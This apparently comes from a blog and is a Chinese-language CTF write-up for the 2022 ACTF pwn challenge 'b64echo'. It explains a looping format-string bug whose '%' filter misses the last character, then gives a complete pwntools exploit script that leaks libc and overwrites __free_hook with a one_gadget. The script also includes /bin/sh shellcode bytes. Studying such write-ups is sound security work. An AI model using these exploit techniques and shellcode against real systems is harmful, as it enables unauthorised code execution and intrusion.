---
title: 2022 ACTF 部分pwn Writeup
date: 2022-06-25 16:54:59 +0800
categories:
  - ctf比赛
tags:
  - pwn
  - ctf
permalink: /posts/id=27/
pin: false
---

## b64echo

![image-20220625174651216](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220625174651216.png)

题目开辟了一个堆块记录一些基值，实现base64解密，漏洞点在格式化字符串，存在循环的格式化字符串漏洞

![image-20220625174706714](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220625174706714.png)

结束时存在一个free操作，考虑用格式化字符串泄露地址，同时修改free_hook为one_gadget

![image-20220625174748511](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220625174748511.png)

难点在于会检验解密后的字符串中是否有`%`，一旦检验到`%`就exit，但并没有对字符串最后一个字符进行校验，导致`%`可以出现在末尾，通过多次输入实现最后需要的payload。

![image-20220625175007793](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220625175007793.png)

```python
# _*_ coding:utf-8 _*_
from pwn import *
import os
import base64
context.log_level = 'debug'
context.arch='amd64'
p = process('./b64echo')
p = remote("121.36.255.51","9999")
elf = ELF("b64echo")
libc = elf.libc
#elf=ELF('./pwn')

def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def decode(con):
    length = len(con)
    sla("Tell me the length of your base64 input: ",length)
    # dbg()
    p.send(con)

def decode1(con):
    length = len(con)
    sla("Tell me the length of your base64 input: ",length)
    dbg()
    p.send(con)

# ---------------------------------
print p.recv()
aaa = raw_input()
p.send(aaa)

decode(base64.b64encode(' 81$p'))
decode('JQ==')

libc_base = int(p.recv(14),16)-0x21C87
lg('libc_base')
one = libc_base + 0x10a2fc
free_hook = libc_base + libc.sym['__free_hook']
exit_hook = 0x61bf60+libc_base
lg('one')
lg('free_hook')

#---------------------------------------------
onel = one&0xffff
oneh = (one>>16)&0xffff
onem = (one>>32)&0xffff
lg('onel')
lg('oneh')
lg('onem')
print len(str(onel))
print len(str(oneh))

pl1 = '%'
pl2 = len(pl1)*'\x00'+str(onel)+'c%'
pl3 = len(pl2)*'\x00'+'50$hn%'
pl4 = len(pl3)*'\x00'+str(oneh-onel)+'c%'
pl5 = len(pl4)*'\x00'+'51$hn'
pl5 = pl5.ljust(0x20,'x')+p64(free_hook)+p64(free_hook+2)


# sleep(0.1)
decode(base64.b64encode((len(str(onem))+3)*' '+'17$hnxhh')+p64(free_hook+4))# 
decode(base64.b64encode(' '+str(onem)+'c'+'%'))
decode(base64.b64encode('%'))


decode(base64.b64encode(pl5))
decode(base64.b64encode(pl4))
decode(base64.b64encode(pl3))
decode(base64.b64encode(pl2))
decode(base64.b64encode(pl1))

p.interactive()

'''
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
```

![image-20220625174610057](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220625174610057.png)